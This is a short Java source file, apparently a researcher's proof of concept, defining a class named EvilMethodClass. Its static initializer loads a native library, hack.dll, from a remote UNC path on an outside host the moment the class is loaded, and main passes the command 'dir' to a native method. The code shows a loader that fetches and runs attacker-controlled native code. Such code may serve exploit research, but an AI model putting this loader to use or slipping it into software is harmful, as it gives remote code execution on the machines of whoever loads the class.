/**
 * @author xuanyh
 */
public class EvilMethodClass {

  static {
    System.load("\\\\test.threedr3am.xyz\\\\hack.dll");
//    System.load("C:\\Users\\threedr3am\\IdeaProjects\\share-project\\src\\main\\resources\\hack.dll");
  }

  public static native String evilMethod(String name);

    public static void main(String[] args) {
        EvilMethodClass.evilMethod("dir");
    }
}
